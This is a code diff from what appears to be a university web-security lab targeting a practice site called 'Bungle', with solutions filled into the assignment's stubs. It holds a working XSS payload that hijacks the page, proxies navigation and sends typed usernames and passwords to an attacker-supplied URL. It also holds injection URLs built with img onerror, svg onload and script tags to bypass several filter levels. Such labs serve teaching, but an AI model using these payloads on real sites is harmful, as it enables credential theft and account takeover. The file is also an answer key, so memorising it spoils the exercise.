@@ -66,86 +66,88 @@ Then just add spying code and hide your suspicious URLs.
 
 // Inject this XSS payload. 
 function payload(attacker) {
-addEventListener('popstate',(event)=>{
+
+window.addEventListener(`popstate`,(event)=>{
+	console.log(event.state.page)
 	proxy(event.state.page, attacker)
-});
+})
+
 function proxy(href, spying_url) {
 
-$('html').hide()
+$(`html`).hide()
 
-$('html').load(href, function() {
-	$.get(attacker, {event:'nav', url:href})
+$(`html`).load(href, function() {
+	$.get(attacker, {event:`nav`, url:href})
 	hijack()
-	document.title = 'Not Bungle!'
-	$('html').show()
-});
+	document.title = `Not Bungle!`
+	$(`html`).show()
+})
 
 function hijack() {
-	let bungLn = $('#bungle-lnk')
-	let sBar = $('#query')
-	let sBut = $('#search-btn')
-	let logB = $('#log-in-btn')
-	let crB = $('#new-account-btn')
-	let usIn = $('#username')
-	let psIn = $('#userpass')
-	let lgoB = $('#log-out-btn')
-	let sA = $('#search-again-btn')
-	let h = $('.history-item')
+	let bungLn = $(`#bungle-lnk`)
+	let sBar = $(`#query`)
+	let sBut = $(`#search-btn`)
+	let logB = $(`#log-in-btn`)
+	let crB = $(`#new-account-btn`)
+	let usIn = $(`#username`)
+	let psIn = $(`#userpass`)
+	let lgoB = $(`#log-out-btn`)
+	let sA = $(`#search-again-btn`)
+	let h = $(`.history-item`)
 
 	function post(type) {
 		$.post(`http://bungle-cs461.csl.illinois.edu/${type}`, {username: usIn.val(), password: psIn.val()},
 		(data) => {
-			proxy('./', attacker)
+			proxy(`./`, attacker)
 		})
 	}
 
 	if (h){
 		h.each((i,obj)=>{
-			if (obj.href.includes('payload')) {
-				obj.style.display = 'none'
+			if (obj.href.includes(`payload`)) {
+				obj.style.display = `none`
 			}
-			obj.removeAttribute('href')
-			obj.addEventListener('click', ()=>{
-				window.history.pushState({page: `./search?q=${obj.text}`},"",`./search?q=${obj.text}`)
+			obj.removeAttribute(`href`)
+			obj.addEventListener(`click`, ()=>{
+				window.history.pushState({page: `./search?q=${obj.text}`},``,`./search?q=${obj.text}`)
 				proxy(`./search?q=${obj.text}`, attacker)
 			})
 		})
 	}
 	if(lgoB){
-		lgoB.attr('type', 'button').click(() => {
-			post('logout')
-			$.get(attacker, {event:'logout'})
+		lgoB.attr(`type`, `button`).click(() => {
+			post(`logout`)
+			$.get(attacker, {event:`logout`})
 		})
 	}
-	bungLn.removeAttr('href').click(() => {
-		window.history.pushState({page: "./"},"","/")
-		proxy('./', attacker)
+	bungLn.removeAttr(`href`).click(() => {
+		window.history.pushState({page: `./`},``,`/`)
+		proxy(`./`, attacker)
 	})
 	if(sBut){
-		sBut.attr('type', 'button').click(() => {
-			window.history.pushState({page: `search?q=${sBar.val()}`},"",`search?q=${sBar.val()}`)
+		sBut.attr(`type`, `button`).click(() => {
+			window.history.pushState({page: `search?q=${sBar.val()}`},``,`search?q=${sBar.val()}`)
 			proxy(`./search?q=${encodeURIComponent(sBar.val())}`, attacker)
 		})
 	}
 	if(logB){
-		logB.attr('type', 'button').click(()=>{
-			post('login')
-			$.get(attacker, {user:usIn.val(), pass:psIn.val(), event:'login'})})
-		crB.attr('type', 'button').click(()=>{
-			post('create')
-			$.get(attacker, {user:usIn.val(), pass:psIn.val(), event:'create'})})
+		logB.attr(`type`, `button`).click(()=>{
+			post(`login`)
+			$.get(attacker, {user:usIn.val(), pass:psIn.val(), event:`login`})})
+		crB.attr(`type`, `button`).click(()=>{
+			post(`create`)
+			$.get(attacker, {user:usIn.val(), pass:psIn.val(), event:`create`})})
 	}
 	if(sA){
-		sA.removeAttr('href').click(()=>{
-			window.history.pushState({page: "./"},"","")
-			proxy('./', attacker)
+		sA.removeAttr(`href`).click(()=>{
+			window.history.pushState({page: `./`},``,``)
+			proxy(`./`, attacker)
 		})
 	}
 }
 }
-//Call Proxy
-window.history.replaceState({page: './'},"","/")
-proxy('./', attacker)
+window.history.replaceState({page: `./`},``,`/`)
+proxy(`./`, attacker)
 }
 
 function makeLink(target, attacker, defense) {
@@ -168,16 +170,40 @@ switch(defense) {
 			);
 	case 3:
 		// TODO: generate XSS URL for defense level 2.2.3.3
-		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			encodeURIComponent(
+				`<img src="" onerror="` +
+				payload_string.replace(/\t/g, '') +
+				`;payload('${attacker}');"` +
+				"/>"
+			);
 	case 4:
 		// TODO: generate XSS URL payload for defense level 2.2.3.4
-		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			encodeURIComponent(
+				`<img src="" onerror="` +
+				payload_string.replace(/\t/g, '') +
+				`;payload('${attacker}');"` +
+				"/>"
+			);
 	case 5:
 		// TODO: generate XSS URL payload for defense level 2.2.3.5
-		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			encodeURIComponent(
+				`<svg/onload="` +
+				payload_string.replace(/\t/g, '') +
+				`payload('${attacker}')"`
+				+ ">"
+			);
 	case 6:
 		// TODO: generate XSS URL payload for defense level 2.2.3.6
-		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			encodeURIComponent(
+				"<script>" +
+				payload_string.replace(/\t/g, ``) + 
+				"payload(`" + attacker + "`)" + 
+				"</script" + ">"
+			);
 }
 }
 
